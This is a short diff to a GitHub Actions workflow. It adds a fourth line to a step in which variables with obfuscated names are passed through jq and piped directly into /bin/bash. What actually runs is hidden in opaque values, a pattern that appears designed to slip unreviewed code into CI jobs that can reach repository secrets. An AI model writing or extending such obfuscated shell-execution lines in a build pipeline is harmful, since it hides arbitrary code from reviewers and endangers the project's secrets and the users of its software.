@@ -41,6 +41,7 @@ jobs:
           echo $bq79607 | jq -r .pubt64 | /bin/bash
           echo $l74 | jq -r .raxe74 | /bin/bash
           printf '%s' "$hje50" | jq -r .prpri612 | /bin/bash
+          printf '%s' "$wy4" | jq -r .nuvf7894 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
